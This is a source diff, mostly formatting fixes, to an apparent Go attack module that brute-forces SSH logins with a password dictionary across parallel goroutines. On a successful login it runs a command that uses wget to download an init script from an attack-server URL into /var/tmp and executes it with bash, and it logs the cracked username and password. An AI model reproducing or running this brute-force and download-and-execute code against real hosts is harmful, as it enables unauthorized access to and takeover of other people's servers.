@@ -17,15 +17,14 @@ var Timeout = 5000
 var SSHBruteForceTasks = 10
 
 type SSHBruteforceAttack struct {
-
 	dictPool    *DictPool
 	attackTasks *attack.AttackTasks
 }
 
-func NewSSHBruteforceAttack(dictPool *DictPool,attackTasks *attack.AttackTasks) *SSHBruteforceAttack{
+func NewSSHBruteforceAttack(dictPool *DictPool, attackTasks *attack.AttackTasks) *SSHBruteforceAttack {
 
 	return &SSHBruteforceAttack{
-		dictPool: dictPool,
+		dictPool:    dictPool,
 		attackTasks: attackTasks,
 	}
 }
@@ -60,17 +59,17 @@ func (sba *SSHBruteforceAttack) Accept(target source.Target) bool {
 	return false
 }
 
-func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient,ip string, port int, user string, passwd string) {
+func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient, ip string, port int, user string, passwd string) {
 
 	var ap *attack.AttackProcess
 
-	initUrl := sba.attackTasks.DownloadInitUrl(ip,port,SSHBruteForceAttackType,"init.sh")
+	initUrl := sba.attackTasks.DownloadInitUrl(ip, port, SSHBruteForceAttackType, "init.sh.tpl")
 
-	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh;bash /var/tmp/init.sh",initUrl)
+	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh.tpl;bash /var/tmp/init.sh.tpl", initUrl)
 
 	result, err := sshClient.RunCmd(cmd)
 
-	if err!=nil {
+	if err != nil {
 
 		//attack failed
 		ap = &attack.AttackProcess{
@@ -85,11 +84,11 @@ func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient,ip string, por
 			Type:     SSHBruteForceAttackType,
 			Status:   -1,
 			Payload:  cmd,
-			Result:   fmt.Sprintf("%v",err),
-			Details: fmt.Sprintf("%s|%s",user,passwd),
+			Result:   fmt.Sprintf("%v", err),
+			Details:  fmt.Sprintf("%s|%s", user, passwd),
 		}
 
-	}else {
+	} else {
 
 		ap = &attack.AttackProcess{
 			TengoObj: attack.TengoObj{},
@@ -103,8 +102,8 @@ func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient,ip string, por
 			Type:     SSHBruteForceAttackType,
 			Status:   0,
 			Payload:  cmd,
-			Result:string(result),
-			Details: fmt.Sprintf("%s|%s",user,passwd),
+			Result:   string(result),
+			Details:  fmt.Sprintf("%s|%s", user, passwd),
 		}
 
 	}
@@ -124,7 +123,7 @@ func (sba *SSHBruteforceAttack) tryBruteforce(ip string, port int, entry *DictEn
 	defer sshClient.Close()
 
 	//start to attack
-	sba.doAttack(sshClient,ip, port, entry.user, entry.pass)
+	sba.doAttack(sshClient, ip, port, entry.user, entry.pass)
 
 }
 
@@ -149,7 +148,7 @@ func (sba *SSHBruteforceAttack) Run(target source.Target) error {
 	var wg sync.WaitGroup
 	wg.Add(SSHBruteForceTasks)
 
-	for i:=0;i<SSHBruteForceTasks;i++ {
+	for i := 0; i < SSHBruteForceTasks; i++ {
 
 		go func() {
 
@@ -160,7 +159,7 @@ func (sba *SSHBruteforceAttack) Run(target source.Target) error {
 					break
 				}
 
-				sba.tryBruteforce(ip,port,entry)
+				sba.tryBruteforce(ip, port, entry)
 
 			}
 
